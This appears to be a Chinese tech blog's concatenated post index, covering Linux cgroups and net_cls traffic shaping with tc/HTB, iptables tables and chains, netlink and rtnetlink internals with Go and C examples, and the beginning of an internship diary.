12345678910# lssubsyscpusetcpu,cpuacctmemorydevicesfreezernet_clsblkioperf_eventhugetlb 0x22 使用案例 1Linux 中把cgroups实现成了文件系统，所以对文件系统里面的特定文件进行操作就可以完成对cgroup的配置。 demo[^coolshell]: 123456int main(void)&#123; int i = 0; for(;;) i++; return 0;&#125; 配置：首先在某个子系统下面建立一个目录，其目录里面会自动创建与其相关的文件 (文件名表示其意义); 其次置具体参数到文件名; 然后把要限制的进程 PID 放入task的文件。 12345# mkdir /sys/fs/cgroup/cpu/eleme# ps uax | grep deadloop root 4260 59.0 0.0 4164 352 pts/0 RN 23:12 3:03 ./deadloop# echo &quot;2000&quot; &gt;&gt; /sys/fs/cgroup/cpu/eleme/cpu.cfs_quota_us# echo &quot;4260&quot; &gt;&gt; /sys/fs/cgroup/cpu/eleme/tasks 配置前： PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 4434 root 25 5 4164 356 280 R 92.0 0.0 0:04.18 deadloop 配置后： PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 4434 root 25 5 4164 356 280 R 2.0 0.0 1:14.91 deadloop 0x23 使用案例 2之所以单独记录了 netcls 的使用，是因为netcls相当于cgroup中其他的控制组使用起来不是很方便 (需要外部工具配合). 在 cgroup 中，通过 netcls 子系统使用识别符 (classid) 标记网络数据包，标记完成过后一般是以下两个操作。 可用流量控制器 (tc) 从不同的cgroup中关联不同的优先级到数据包，这个场景多数是用于QOS相关。 也可以用iptables来对这些具有这些特征 (-m cgroup) 流量做一些具体的操作，这个操作幅度比QOS的要大，根据iptables的不同table提供的-J有很多动作可以做。 Basic Queuing technology 在描述Linux QOS之前需要想象最基本的队列技术 - 普通队列 (FIFO), 而后对其有了点改进诞生了由 3 个队列一起工作 (pfifo), 由多个队列一起工作的 (Stochastic Fair Queuing) 和拿着令牌才能走包的 (token bucket filter)[^qdisc].需要补充说明的是虽然 linux 也支持基于字节的队列技术bfifo, 但是bfifo在特性支持上要远逊色于pfifo. pfifo 接口默认队列技术的 pfifo_fast pfifo(基于 packet 的 fifo) 默认是使用三个队列，能提供基本的优先级功能。 SFQ 看上去公平的 sfq sfq 的公平是由 hash 与轮序算法保证的。更多信息 [这里](http://wiki.mikrotik.com/wiki/Manual:Queue#SFQ) tbf 拿着令牌才放行的 tbf 即使这样多数情况依然不够！ 比如”A,B,C,D 四个服务，其中 A 是延迟敏感的视频会议，B 是吞吐量大的 bt 下载，C,D 普通的 web 流量”, 上面提供的这些功能或多或少只能满足一部分服务。这个时候一个层次化的划分队列被开发出来了，虽然 linux 也实现了其它的有类队列规则，但是他们远不如其中的 HTB(Hierarchical Token Bucket) 使用更加广泛 [^packet_flow]. HTB htb 允许创建层次的队列结构与决定队列之间的关系 (父 - 子，子 - 子). 一般的使用步骤如下： 1: 匹配和标记流量：将流量分类待使用，利用包含一个或者多个匹配参数来选择数据包构成一个 class 2: 创建策略到标记的流量上：把具体的 class 放到特定的队列中并定义每个 class 携带的动作。 3: 附加策略到到特定接口：附加策略到全局接口 (全局进，全局出，全局进出), 特定接口或者父队列。 htb demo[^htb]: 1234567891011121314151617181920212223# This line sets a HTB qdisc on the root of eth0, and it specifies that # the class 1:30 is used by default. It sets the name of the root as 1:, for future references.tc qdisc add dev eth0 root handle 1: htb default 30# This creates a class called 1:1, which is direct descendant of root (the parent is 1:),# this class gets assigned also an HTB qdisc, and then it sets a max rate of 6mbits, with a burst of 15ktc class add dev eth0 parent 1: classid 1:1 htb rate 6mbit burst 15k# The previous class has this branches:# Class 1:10, which has a rate of 5mbittc class add dev eth0 parent 1:1 classid 1:10 htb rate 5mbit burst 15k# Class 1:20, which has a rate of 3mbittc class add dev eth0 parent 1:1 classid 1:20 htb rate 3mbit ceil 6mbit burst 15k# Class 1:30, which has a rate of 1kbit. This one is the default class.tc class add dev eth0 parent 1:1 classid 1:30 htb rate 1kbit ceil 6mbit burst 15k# Martin Devera, author of HTB, then recommends SFQ for beneath these classes:tc qdisc add dev eth0 parent 1:10 handle 10: sfq perturb 10tc qdisc add dev eth0 parent 1:20 handle 20: sfq perturb 10tc qdisc add dev eth0 parent 1:30 handle 30: sfq perturb 10 HTB 使用信息 这里, 理论基础, 实现细节. 对前面的QOS有了了解，加上在 2014 年netfilter支持了cgroup特性，用户态需要安装新的 iptables, 而后可以match出cgroup相关的流量，这个时候net_cls才算能和netfilter一起工作 [^net_cls_doc]. 1234567891011121314151617181920212223#!/bin/shINTERFACE=eno16777736# configuring tc:tc qdisc add dev $INTERFACE root handle 10: htb# creating traffic class 10:1 and configure the rate with 40mbittc class add dev $INTERFACE parent 10: classid 10:1 htb rate 40mbit# filter special traffictc filter add dev $INTERFACE parent 10: protocol ip prio 10 handle 1: cgroup# create new Hierarchyif [ ! -d /sys/fs/cgroup/net_cls/0 ]; then mkdir /sys/fs/cgroup/net_cls/0fi# send 0010:0001 to net_cls.classidecho 0x00100001 &gt; /sys/fs/cgroup/net_cls/0/net_cls.classid# use iptables to match cgroup traffic and drop it.iptables -A OUTPUT -m cgroup --cgroup 0x00100001 -j DROP [^access]: redhat access[^wiki]: wikipedia[^coolshell]: coolshell[^net_cls_doc]: cgroup net_cls doc[^linux_tc]: Linux taffic control[^linux_fw]: linux firewalls[^packet_flow]: MikroTik RouterOS packet flow[^qdisc]: classful qdiscs[^htb]: HTB[^example]: cgroup 使用范例","tags":["linux"]},{"title":"iptables usage","path":"/2016/07/24/iptables/","content":"netfilter &amp; iptables Netfilter, 在 Linux 内核中的一个软件框架，用于管理网络数据包。不仅具有网络地址转换（NAT）的功能，也具备数据包内容修改、以及数据包过滤等防火墙功能。 以上内容引自 Wikipedia,netfilter 做为一个内核框架，它可以在不同阶段将函数hook进网络栈，框架本身并不处理数据包 [^linux_fw]. iptables, 一个运行在用户空间的应用软件，通过控制 Linux 内核 netfilter 模块，来管理网络数据包的流动与转送。在大部分的 Linux 系统上面，iptables 是使用 &#x2F;usr&#x2F;sbin&#x2F;iptables 来操作，文件则放置在手册页（Man page[2]）底下，可以通过 man iptables 指令获取。 iptables做为一个用户态工具，提供一些术语 (table,chain,match,target) 准确描述了一些网络管理，这些术语离开iptables上下文可能意义不一样。 netflow 浏览器放大看 iptables默认提供四个table, 不同的table内置了不同的chain, 不同chain提供了不近相同的target. filter: 用于应用过滤规则。 nat: 用于应用地址转化。 mangle: 用于修改分组数据。 raw: 想独立与 netfilter 链接跟踪子系统作用的规则应用于这.(可以在图里由raw表所在位置确认) 具体的的各个chain对数据包的处理流程可以参考上图，数据包先进入raw表的preroute链，而后进入mangle的preroute链，如此推理。 iptables demo[^example]:iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 把默认 HTTP 端口的数据包由 80 转向 8080 端口，在路由决策前被处理，而后进入mangle的input后，又进入filter的input交与 socket.-t参数后面认识是table,-A表示对后面的chain进行增加条目，在往后一些事match规则，-j后面就是target.","tags":["linux"]},{"title":"netlink protocol I","path":"/2016/07/21/netlink-i/","content":"0x00 Introduction0x01 what is netlink?netlink 是一种用户进程和内核，或者进程之间的沟通机制，不能用于跨主机的沟通 ^manual. 0x02 the advantage of netlink?多数的 Linux 内核态程序都需要和用户空间的进程交换数据，但是传统的 Unix 的 IPC (各类管道、消息队列、内存共享、信号量) 机制不能为进程与内核通讯提供足够的支持 [^ibm1].不过 Linux 提供了很多与内核沟通的方法如内核启动参数、模块参数与 sysfs、sysctl、系统调用、netlink、procfs、seq_file、debugfs 和 relayfs[^ibm2]. 沟通方法 应用场景 内核启动参数 内核开发者可以通过这种方式来向内核传输数据，从而控制内核启动行为。 模块参数，sysfs 当内核部分子系统编译成模块，则可以通过命令行在插入模块时传递参数，或在运行时，通过 sysfs 来设置或读取模块数据。 sysctl 其被应用来设置与获取运行时内核的配置参数，通过这种方式，用户应用可以在内核运行的任何时刻来改变内核的配置参数，也可以在任何时候获得内核的配置参数。 系统调用 是内核提供给应用程序的接口，应用对底层硬件的操作大部分都是通过调用系统调用来完成的。 netlink 是一种在内核与用户应用间进行双向数据传输的非常好的方式。 procfs 是较老的用户态与内核态的数据交换方式，内核很多数据通过这种方式提供给用户，内核很多参数也是通过这种方式来用户方便设置，但其有一个缺陷，若输出内容大于 1 个内存页，需要多次读。 debugfs 只有在需要的时候使用，它在需要时通过在一个虚拟文件系统中创建一个或多个文件来向用户空间应用提供调试信息。 relayfs 是一个快速的转发（relay）数据的文件系统，它以其功能而得名。它为那些需要从内核空间转发大量数据到用户空间的工具和应用提供了快速有效的转发机制。 Netlink 相对于系统调用，ioctl 以及 &#x2F;proc 文件系统而言具有以下优点： 为了使用 netlink, 用户仅需要在 include&#x2F;linux&#x2F;netlink.h 中增加一个新类型的 netlink 协议定义即可，如 #define NETLINK_MYTEST 17 然后，内核和用户态应用就可以立即通过 socket API 使用该 netlink 协议类型进行数据交换。但系统调用需要增加新的系统调用，ioctl 则需要增加设备或文件，那需要不少代码，proc 文件系统则需要在 &#x2F;proc 下添加新的文件或目录，那将使本来就混乱的 &#x2F;proc 更加混乱。 netlink 是一种异步通信机制，在内核与用户态应用之间传递的消息保存在 socket 缓存队列中，发送消息只是把消息保存在接收者的 socket 的接收队列，而不需要等待接收者收到消息，但系统调用与 ioctl 则是同步通信机制，如果传递的数据太长，将影响调度粒度。 使用 netlink 的内核部分可以采用模块的方式实现，使用 netlink 的应用部分和内核部分没有编译时依赖，但系统调用就有依赖，而且新的系统调用的实现必须静态地连接到内核中，它无法在模块中实现，使用新系统调用的应用在编译时需要依赖内核。 netlink 支持多播，内核模块或应用可以把消息多播给一个 netlink 组，属于该 neilink 组的任何内核模块或应用都能接收到该消息，内核事件向用户态的通知机制就使用了这一特性，任何对内核事件感兴趣的应用都能收到该子系统发送的内核事件，在后面的文章中将介绍这一机制的使用。 内核可以使用 netlink 首先发起会话，但系统调用和 ioctl 只能由用户应用发起调用。 netlink 使用标准的 socket API, 因此很容易使用，但系统调用和 ioctl 则需要专门的培训才能使用。 0x03 netlink featurenetlink 只是框架提供基本的和内核沟通的功能，具体要做的事情由基于 netlink 的子协议做。而内核中已经存在基于 netlink 的具体协议有Linux/include/uapi/linux/netlink.h: 1234567891011121314151617181920212223#define NETLINK_ROUTE 0\t/* Routing/device hook */#define NETLINK_UNUSED 1\t/* Unused number */#define NETLINK_USERSOCK\t2\t/* Reserved for user mode socket protocols\t*/#define NETLINK_FIREWALL\t3\t/* Unused number, formerly ip_queue */#define NETLINK_SOCK_DIAG\t4\t/* socket monitoring */#define NETLINK_NFLOG 5\t/* netfilter/iptables ULOG */#define NETLINK_XFRM 6\t/* ipsec */#define NETLINK_SELINUX 7\t/* SELinux event notifications */#define NETLINK_ISCSI 8\t/* Open-iSCSI */#define NETLINK_AUDIT 9\t/* auditing */#define NETLINK_FIB_LOOKUP\t10\t#define NETLINK_CONNECTOR\t11#define NETLINK_NETFILTER\t12\t/* netfilter subsystem */#define NETLINK_IP6_FW 13#define NETLINK_DNRTMSG 14\t/* DECnet routing messages */#define NETLINK_KOBJECT_UEVENT\t15\t/* Kernel messages to userspace */#define NETLINK_GENERIC 16/* leave room for NETLINK_DM (DM Events) */#define NETLINK_SCSITRANSPORT\t18\t/* SCSI Transports */#define NETLINK_ECRYPTFS\t19#define NETLINK_RDMA 20#define NETLINK_CRYPTO 21\t/* Crypto layer */#define NETLINK_INET_DIAG\tNETLINK_SOCK_DIAG 0x04 the architecture of netlink[^lwn] +---------------------+ +---------------------+ | (3) application \"A\" | | (3) application \"B\" | +------|--------------+ +--------------|------+ | | \\ / \\ / | | +-------|--------------------------------|-------+ | : : | user-space =====+ : (5) Kernel socket API : +================ | : : | kernel-space +--------|-------------------------------|-------+ | | +-----|-------------------------------|----+ | (1) Netlink subsystem | +---------------------|--------------------+ | +---------------------|--------------------+ | (2) Generic Netlink bus | +--|--------------------------|-------|----+ | | | +-------|---------+ | | | (4) Controller | / \\ +-----------------+ / \\ | | +------------------|--+ +--|------------------+ | (3) kernel user \"X\" | | (3) kernel user \"Y\" | +---------------------+ +---------------------+ 0x10 date struct0x11 netlink protocol在 linux 内核中每个协议都需要注册一个net_proto_family实例，该函数包含一个函数指针，在创建属于该协议族的 socket 的时候被调用，netlink 的这个函数指针是 netlink_create, 该函数分配一个struct sock的实例，通过 socket-&gt;sk 关联到 socket, 不过这个函数不仅为struct sock分配了空间，也为netlink_sock分配了空间。 12345678910111213141516struct netlink_sock &#123;\t/* struct sock has to be the first member of netlink_sock */\tstruct sock sk;\tu32 portid;\tu32 dst_portid;\tu32 dst_group;\tu32 flags;\tu32 subscriptions;\t...\twait_queue_head_t\twait;\tstruct netlink_callback\t*cb;\t...\tvoid (*netlink_rcv)(struct sk_buff *skb);\tvoid (*netlink_bind)(int group);\t...&#125;; 省略了一部分代码，保留了主题。可以看见sock实例直接嵌入netlink_sock中，给出的一个netlink套接字的struct sock实例，与之相关联，特定于netlink的netlink_socket实例，可以使用nlk_sk获得。链接两端的端口 ID 分别保存在portid和dst_portid中。netlink_rcv是在socket接受到数据时候调用。 0x12 the address of socket类似于其余网络协议，每个netlink套接字也需要分配一个地址，下列struct sockaddr的变体表示netlink地址： 123456struct sockaddr_nl &#123;\t__kernel_sa_family_t\tnl_family;\t/* AF_NETLINK\t*/\tunsigned short\tnl_pad; /* zero */\t__u32 nl_pid; /* port ID\t*/\t__u32 nl_groups;\t/* multicast groups mask */&#125;; 为区分具体的子协议内核使用了 nl_family 字段，&lt;netlink.h&gt;指定了不同的几种族，就是上面具体作用部分列出来的。nl_pad 是对其补全总是 0. nl_pid 为发送消息的进程 pid, 若是希望内核处理或者多播消息则置 0, 否则为处理消息的线程组 id. 字段 nl_groups 用于指定播组，bind 函数用于把调用进程加入到该字段指定的播组，若是为 0 表示不加入任何播组。若是一个进程的多个线程使用 netlink socket 的情况，进程的字段的 nl_pid 可以设置为其他值。因此字段nl_pid实际上未必是进程 ID, 它只是用于区分不同的接收者或发送者的一个标识，用户可以根据自己需要设置该字段。 0x13 message format Message Format: +----------|- - -|-------------|----|---------- | nlmsghdr | Pad | Payload |Pad | nlmsghdr +----------|- - -|-------------|----|---------- nlmsg_data(nlh)---^ ^ nlmsg_next(nlh)-----------------------+ 一个基本的消息单元有两个部分组成：头部与 payload, 且这个 message 对齐到NLMSG_ALIGNTO, 一般是#define NLMSG_ALIGNTO\t4U. 0x14 netlink messages header不同于 BSD 套接字，头信息中的标识和目的地都是自动生成，Netlink 消息头（结构体 nlmsghdr）必须由发送方准备好，就像 socket 工作在 SOCK_RAW 模式下 一样。尽管 SOCK_DGRAM 被用于创建它。 1234567struct nlmsghdr &#123; __u32 nlmsg_len;\t/* Length of message including header */ __u16 nlmsg_type;\t/* Message content */ __u16 nlmsg_flags;\t/* Additional flags */ __u32 nlmsg_seq;\t/* Sequence number */ __u32 nlmsg_pid;\t/* Sending process port ID */ &#125;; nlmsg_type是基于netlink的协议的私有的，netlink协议不去检查子协议。nlmsg_flags的类型都定义在netlink.h里面了，一般情况下只要关注：如果消息包含一个请求，要求执行特定的操作 (而不是传输一些状态信息), 那么NLM_F_REQUEST将被置位，而NLM_F_ACK要求在接受上述消息并成功返回处理请求之后发送一个ack. 标准的 flages, 其余的并没有列出了来linux/include/uapi/linux/netlink.h. 12345#define NLM_F_REQUEST 1\t/* It is request message. */#define NLM_F_MULTI 2\t/* Multipart message, terminated by NLMSG_DONE */#define NLM_F_ACK 4\t/* Reply with ack, with zero or error code */#define NLM_F_ECHO 8\t/* Echo this request */#define NLM_F_DUMP_INTR 16\t/* Dump was inconsistent due to sequence change */ 0x15 netlink messages payload按照 rfc 里面的定义的服务模型，payload 部分就是基于 netlink 的子协议的数据，各个具体的子协议不同。 0x20 How to use netlink?0x21 in userspace在用户态应用使用标准的 socket 与内核通讯，标准的 socket API 的函数，socket(), bind(), sendmsg(), recvmsg() 和 close() 很容易地应用到 netlink socket。为了创建一个 netlink socket，用户需要使用如下参数调用 socket(): socket(AF_NETLINK, SOCK_RAW, netlink_type) 用户态更多的应用场景是使用libnl库 这里. 0x22 kernelspacenetlink 的内核实现在net/netlink/af_netlink.c中，内核模块要想使用 netlink, 也必须包含头文件linux/netlink.h. 内核使用 netlink 需要专门的 API, 这完全不同于用户态应用对 netlink 的使用。如果用户需要增加新的 netlink 协议类型，必须通过修改linux/netlink.h来实现，当然，目前的 netlink 实现已经包含了一个通用的协议类型 NETLINK_GENERIC 以方便用户使用，用户可以直接使用它而不必增加新的协议类型。 [^ibm1]: Linux 系统内核空间与用户空间通信的实现与分析[^ibm2]: 在 Linux 下用户空间与内核空间数据交换的方式[^lwn]: LWN","tags":["linux"]},{"title":"netlink route","path":"/2016/07/21/netlink-route/","content":"0x00 NETLINK_ROUTErtnetlink基于netlink, 它允许 kernel 的路由表被读或者修改，它常被 kernel 用来和其他的子系统的用户态程序通讯。 0x01 introduction虽然被称为”Linux IPv4 routing socket”, 不过目前这个protocol已经支持了ipv6, 这个类型protocol主要提供了网络相关的信息。对于这个协议，Linux 声明了大量的子消息，更多的信息可以参考 manual[^tcwiki]: 名称 消息类型 链路层 RTM_NEWLINK, RTM_DELLINK, RTM_GETLINK, RTM_SETLINK 地址设定 RTM_NEWADDR, RTM_DELADDR, RTM_GETADDR 路由表 RTM_NEWROUTE, RTM_DELROUTE, RTM_GETROUTE 邻居缓存 TM_NEWNEIGH, RTM_DELNEIGH, RTM_GETNEIGH 路由规则 RTM_NEWRULE, RTM_DELRULE, RTM_GETRULE Queuing Discipline Settings RTM_NEWQDISC, RTM_DELQDISC, RTM_GETQDISC Traffic Classes used with Queues RTM_NEWTCLASS, RTM_DELTCLASS, RTM_GETTCLASS 流量过滤 RTM_NEWTFILTER, RTM_DELTFILTER, RTM_GETTFILTER 其它 RTM_NEWACTION, RTM_DELACTION, RTM_GETACTION, RTM_NEWPREFIX, RTM_GETPREFIX, RTM_GETMULTICAST, RTM_GETANYCAST, RTM_NEWNEIGHTBL,RTM_GETNEIGHTBL, RTM_SETNEIGHTBL 0x02 Network Route Service Module^rfc这个服务提供了网络路由的创建，移除与接收网络路由，这个服务的messages模板如下，字段的更多信息参考RFC3549的 3.1.1. 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Family | Src length | Dest length | TOS | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Table ID | Protocol | Scope | Type | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Flags | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ 0x03 Neighbor Setup Service Module这个服务提供增加，移除和接受邻居信息的能力，这个服务messages模板如下，字段的更多信息参考RFC3549的 3.1.2. 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Family | Reserved1 | Reserved2 | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Interface Index | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | State | Flags | Type | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ 0x03 Traffic Control Service这个服务提供了供给，查询与侦听支持流量控制事件的能力，linux 下面流量控制是非常具有弹性 (复杂), 字段的更多信息参考RFC3549的 3.1.3. 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Family | Reserved1 | Reserved2 | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Interface Index | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Qdisc handle | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Parent Qdisc | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | TCM Info | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ 0x20 demo API to the configuration interfaces of the NETLINK_ROUTE family including network interfaces, routes, addresses, neighbours, and traffic control. 引用在libnl-route介绍，对照 RFC 定义的ip service部分还是都支持的，着也是主流的NETLINK_ROUTE的使用途径。 0x21 emulateing wide networkvishvananda封装了golang的netlink的库，可以做ip service中traffic control的事情，比如去模拟广域网。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091package mainimport ( &quot;fmt&quot; &quot;github.com/vishvananda/netlink&quot; &quot;os/exec&quot; )func main() &#123; // 毁坏测试 fmt.Println(&quot; 包毁坏测试&quot;) NetCorruption(20) check_interface_status() StopNetCorruption() check_interface_status()&#125;// 检查状态func check_interface_status() &#123; output, err := exec.Command(&quot;/sbin/tc&quot;, &quot;qdisc&quot;).Output() if err != nil &#123; fmt.Println(&quot;error in cmd.start()&quot;) &#125; fmt.Printf(&quot;%v&quot;, string(output))&#125;// 获得网卡的 Indexfunc get_interface_list() []int &#123; interfaces, _ := netlink.LinkList() var interface_index []int for _, name := range interfaces[1:] &#123; interface_index = append(interface_index, name.Attrs().Index) &#125; return interface_index&#125;// 构造出每网卡 qdisc 属性，类似 dev inferface_name root netemfunc constructor_qdiscattrs() []netlink.QdiscAttrs &#123; linkindexs := get_interface_list() var netems []netlink.QdiscAttrs for _, indexs := range linkindexs &#123; var qdisc_attrs = netlink.QdiscAttrs&#123; Parent: netlink.HANDLE_ROOT, LinkIndex: indexs, &#125; netems = append(netems, qdisc_attrs) &#125; return netems&#125;// 具体的 do 执行func traffic_control(nattrs netlink.NetemQdiscAttrs) error &#123; var netems = constructor_qdiscattrs() for _, netem := range netems &#123; err := netlink.QdiscAdd(netlink.NewNetem(netem, nattrs)) if err != nil &#123; fmt.Printf(&quot;traffic_control %v &quot;, err) return err &#125; &#125; return nil&#125;// 具体的 undo 执行func undo_traffic_control() error &#123; fmt.Println(&quot;undo operation&quot;) links, _ := netlink.LinkList() for _, link := range links &#123; netems, _ := netlink.QdiscList(link) for _, netem := range netems &#123; err := netlink.QdiscDel(netem) if err != nil &#123; fmt.Printf(&quot;undo_traffic_control %v &quot;, err) return err &#125; &#125; &#125; return nil&#125;// 实参单位是 %, 例如实参是 80, 表示损坏率 80%func NetCorruption(precents float32) &#123; var nattrs netlink.NetemQdiscAttrs nattrs.CorruptProb = precents traffic_control(nattrs)&#125;func StopNetCorruption() &#123; undo_traffic_control()&#125; 0x21 monitor routing table当然可以直接使用系统自带的rtnetlink.h来监控路由表。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#include &lt;sys/socket.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;linux/netlink.h&gt;#include &lt;linux/rtnetlink.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#define ERR_RET(x) do &#123; perror(x); return EXIT_FAILURE; &#125; while (0);#define BUFFER_SIZE 4095int loop (int sock, struct sockaddr_nl *addr)&#123; int received_bytes = 0; struct nlmsghdr *nlh; char destination_address[32]; char gateway_address[32]; struct rtmsg *route_entry; /* This struct represent a route entry in the routing table */ struct rtattr *route_attribute; /* This struct contain route attributes (route type) */ int route_attribute_len = 0; char buffer[BUFFER_SIZE]; bzero(destination_address, sizeof(destination_address)); bzero(gateway_address, sizeof(gateway_address)); bzero(buffer, sizeof(buffer)); /* Receiving netlink socket data */ while (1) &#123; received_bytes = recv(sock, buffer, sizeof(buffer), 0); if (received_bytes &lt; 0) ERR_RET(&quot;recv&quot;); /* cast the received buffer */ nlh = (struct nlmsghdr *) buffer; /* If we received all data ---&gt; break */ if (nlh-&gt;nlmsg_type == NLMSG_DONE) break; /* We are just intrested in Routing information */ if (addr-&gt;nl_groups == RTMGRP_IPV4_ROUTE) break; &#125;/* Reading netlink socket data *//* Loop through all entries *//* For more informations on some functions : * http://www.kernel.org/doc/man-pages/online/pages/man3/netlink.3.html * http://www.kernel.org/doc/man-pages/online/pages/man7/rtnetlink.7.html */for ( ; NLMSG_OK(nlh, received_bytes); nlh = NLMSG_NEXT(nlh, received_bytes))&#123; /* Get the route data */ route_entry = (struct rtmsg *) NLMSG_DATA(nlh); /* We are just intrested in main routing table */ if (route_entry-&gt;rtm_table != RT_TABLE_MAIN) continue; /* Get attributes of route_entry */ route_attribute = (struct rtattr *) RTM_RTA(route_entry); /* Get the route atttibutes len */ route_attribute_len = RTM_PAYLOAD(nlh); /* Loop through all attributes */ for ( ; RTA_OK(route_attribute, route_attribute_len); route_attribute = RTA_NEXT(route_attribute, route_attribute_len)) &#123; /* Get the destination address */ if (route_attribute-&gt;rta_type == RTA_DST) &#123; inet_ntop(AF_INET, RTA_DATA(route_attribute), destination_address, sizeof(destination_address)); &#125; /* Get the gateway (Next hop) */ if (route_attribute-&gt;rta_type == RTA_GATEWAY) &#123; inet_ntop(AF_INET, RTA_DATA(route_attribute), gateway_address, sizeof(gateway_address)); &#125; &#125; /* Now we can dump the routing attributes */ if (nlh-&gt;nlmsg_type == RTM_DELROUTE) fprintf(stdout, &quot;Deleting route to destination --&gt; %s and gateway %s &quot;, destination_address, gateway_address); if (nlh-&gt;nlmsg_type == RTM_NEWROUTE) printf(&quot;Adding route to destination --&gt; %s and gateway %s &quot;, destination_address, gateway_address);&#125; return 0;&#125;int main(int argc, char **argv)&#123; int sock = -1; struct sockaddr_nl addr; /* Zeroing addr */ bzero (&amp;addr, sizeof(addr)); if ((sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)) &lt; 0) ERR_RET(&quot;socket&quot;); addr.nl_family = AF_NETLINK; addr.nl_groups = RTMGRP_IPV4_ROUTE; if (bind(sock,(struct sockaddr *)&amp;addr,sizeof(addr)) &lt; 0) ERR_RET(&quot;bind&quot;); while (1) loop (sock, &amp;addr); /* Close socket */ close(sock); return 0;&#125; 可以通过下面参数看见： 1234# route add -host 10.113.0.0 gw localhostAdding route to destination --&gt; 10.113.0.0 and gateway 127.0.0.1# route del -host 10.113.0.0 gw localhostDeleting route to destination --&gt; 10.113.0.0 and gateway 127.0.0.1 [^tcwiki]: wikipedia TC","tags":["linux"]},{"title":"internship in Beijing","path":"/2016/06/30/intern-in-beijing/","content":"自南京到北京。发现北方的冷和南方的冷不同，南方的冷是侵入式的湿冷像个小妖精慢慢把你腐蚀，北方的冷干燥像个暴躁的汉子来的猛烈如狂风卷席。 契机の旧都学校的生活既无聊又无聊，每天按时上下课，自己看看书玩玩代码，无聊中想找点变化，就有了找份实习感受一下职场的念头。15 年 11 月左右，约了南邮大表哥来看妹子，和他讲到学校的生活和自己的想法，遂被要去了简历，内推面试通过了，获得进入了红厂实习的机会，拿到 offer 的时还是蛮震惊的，居然能面过红帽。 京城の试炼初访都城2015 年 12 月 22 早上 9 点 30 左右到的北京五道口地铁站，拖着行李箱走到地铁站外，北方真的好冷！电话联系了二房东，找到了马上要住的宿舍，很小也很破，落差感难免，不过也是那时候第一次感受到了北方的暖气真是个好东西。当天下午 2 点左右跑去了公司想看一下，走在路上外面真冷，融科 C 外面立着 VMware 的牌子，在想想南京立判高下，一想以后要在这里上班对住处的失望暂时忘却了。进了公司才发现不能提前入职，不过还是见到了 Team leader, 而后去了宜家买了一堆床上用品，规划接下来两天的玩法.(嘿嘿嘿) 国家图书馆 圣诞节昨天，到了工位，领了设备和办公用品。环顾周围，感受到工程师对美得欣赏大抵上是相同的：黑色有棱角的设计，冷色的终端配色，codeing 时候听着 douban.fm 等等。在一说今天是圣诞节，回想我在上大学之前是没有圣诞节的，上了大学过后发现同学们过圣诞节我才感受到洋节日的气氛，往年的今天我总是能收到苹果之类的，但是今年不在难免有点怀念大学时光。可能这就是围城。虽然公司提供了很不错的圣诞早餐，但是还是不如在学校来的好玩呢。 圣诞节 Team作为一个开源软件公司，它的社区气氛很浓，到处可见社区的小玩意，当然公司本身也是雇了社区的人。同事们的技术能力也很厉害，偷拍同事显示器可以看到密密麻麻的小终端，这样的东西我的眼睛是处理不过来的哈。 team 大家上班幸福感很高 (上图为证), 很好玩的一个 team, 当然他们的职业水平也很厉害，而我是菜鸟，能和他们一起工作真是幸运！ 工作我的 title 是 intern, 感觉好笼统哦，主要任务学习 kernel, 做一些 nfs bug 测试之类的事情。mentor 是 jh 和 yc, 两位富有经验的工程师让我知道了rhel kernel的开发流程和 bug 的生命周期。jh 之前在 hw 做了多年研发，扎实的专业背景知识和对系统编程的理解让我这个曾经狂妄的小菜顿感羞愧。yc 是是前 sun 的雇员，像个热情的大哥，我实习生周末进不了公司，他把自己的卡借我，对我信任和无私帮助让这个小北漂感到了关怀 (嘿嘿嘿). gongwei 生活因为图近，所以在学校时候就安排好了住处 – 